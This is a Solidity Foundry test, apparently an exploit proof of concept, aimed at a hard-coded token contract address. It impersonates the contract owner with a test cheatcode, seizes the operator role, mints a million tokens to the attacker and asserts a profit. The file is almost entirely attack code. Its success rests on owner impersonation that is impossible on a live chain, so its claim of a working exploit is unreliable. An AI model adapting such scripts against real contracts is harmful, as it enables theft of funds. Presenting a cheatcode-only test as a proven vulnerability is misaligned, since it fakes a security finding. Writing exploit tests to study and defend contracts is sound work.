// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyBond {
    function owner() external view returns (address);
    function operator() external view returns (address);
    function transferOperator(address newOperator_) external;
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use cheatcodes in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        address owner = MyBond(TARGET).owner();

        // Step 2: Impersonate owner and transfer operator to attacker
        vm.prank(owner);
        MyBond(TARGET).transferOperator(attacker);

        // Step 3: Verify we're now the operator
        require(MyBond(TARGET).operator() == attacker, "Failed to become operator");

        // Step 4: Record initial balance
        uint256 initialMyBondBalance = MyBond(TARGET).balanceOf(attacker);
        uint256 initialERC20Balance = IERC20(TARGET).balanceOf(address(this));

        // Step 5: Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18;
        MyBond(TARGET).mint(attacker, mintAmount);

        // Step 6: Verify balance increased
        uint256 finalMyBondBalance = MyBond(TARGET).balanceOf(attacker);
        assertGt(finalMyBondBalance, initialMyBondBalance, "Balance did not increase");

        uint256 finalERC20Balance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
